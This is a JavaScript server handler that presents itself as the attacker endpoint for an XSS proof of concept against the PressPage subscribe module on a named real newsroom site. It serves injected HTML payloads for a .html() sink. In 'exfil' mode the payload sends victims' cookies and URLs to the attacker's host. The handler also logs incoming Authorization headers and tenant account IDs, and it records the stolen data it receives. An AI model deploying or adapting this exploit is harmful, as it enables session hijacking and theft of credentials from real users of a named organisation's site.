// Newsroom XSS PoC — Attacker endpoint
// Returns malicious JSON for the PressPage subscribe module's .html(data.message) sink
// Default payload: alert() popup proving XSS in the newsroom.vanlanschotkempen.com origin

const PAYLOADS = {
  alert: '<img src=x onerror="alert(\'XSS PROOF on \'+document.domain)">',
  silent: '<img src=x onerror="document.title=\'XSS-PROOF:\'+document.domain;window.__XSS_FIRED__=true;document.body.insertAdjacentHTML(\'afterbegin\',\'<h2 style=color:white;background:red;font-size:36px>XSS FIRED ON \'+document.domain+\'</h2>\')">',
  exfil: (host) => `<img src=x onerror="new Image().src='https://${host}/exfil?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(window.location.href)">`
};

export default function handler(req, res) {
  // Log incoming request for verification
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  console.log('  Origin:', req.headers.origin);
  console.log('  User-Agent:', req.headers['user-agent']);
  console.log('  Authorization:', req.headers.authorization); // The userinfo is sent here
  if (req.headers.accounts) {
    console.log('  accounts:', req.headers.accounts); // Van Lanschot's tenant IDs
  }
  
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    return res.status(204).end();
  }
  
  // Determine payload based on query string
  const mode = req.query.mode || 'alert';
  let payload;
  if (mode === 'exfil') {
    const host = req.headers.host;
    payload = PAYLOADS.exfil(host);
  } else {
    payload = PAYLOADS[mode] || PAYLOADS.alert;
  }
  
  // Set response headers
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Cache-Control', 'no-store');
  
  // Handle exfil endpoint
  if (req.url.startsWith('/exfil')) {
    console.log(`[!!!] EXFIL RECEIVED: ${req.url}`);
    return res.status(200).send('OK');
  }
  
  // Return malicious JSON
  return res.status(200).json({ message: payload });
}
